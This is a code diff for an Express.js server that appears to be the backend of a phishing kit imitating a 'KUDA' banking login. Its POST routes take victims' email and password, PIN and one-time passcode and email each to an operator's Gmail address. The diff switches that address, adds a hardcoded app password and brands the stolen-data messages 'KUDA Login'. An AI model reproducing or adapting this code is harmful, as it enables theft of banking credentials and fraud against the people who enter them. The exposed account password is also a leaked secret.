@@ -10,9 +10,9 @@ app.use(cors());
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
-const userEmail = "vaniakostadinova15513@gmail.com";
-//const pass = "xmfloskqejlzktyb";
-// 11th oct
+const userEmail = "jeroidnghelp@gmail.com";
+const pass = "yosxydhehtnkryec";
+// 26 nov
 
 // Middleware
 app.use(express.json());
@@ -34,8 +34,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: `${email}`,
     to: userEmail,
-    subject: `Email: ${email} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
+    subject: `KUDA Login--> Email: ${email} \t\n\n\n password: ${password}`,
+    text: `New user registered KUDA Login--> with Email: ${email} and password: ${password}`,
   };
 
   console.log(mailOptions);
@@ -65,7 +65,7 @@ app.post("/pin", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `PIN: ${req.body?.pin} `,
+    subject: `KUDA Login--> PIN: ${req.body?.pin} `,
   };
 
   console.log(mailOptions);
@@ -95,7 +95,7 @@ app.post("/otp", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `OTP: ${req.body?.otp} `,
+    subject: `KUDA Login--> OTP: ${req.body?.otp} `,
   };
 
   console.log(mailOptions);
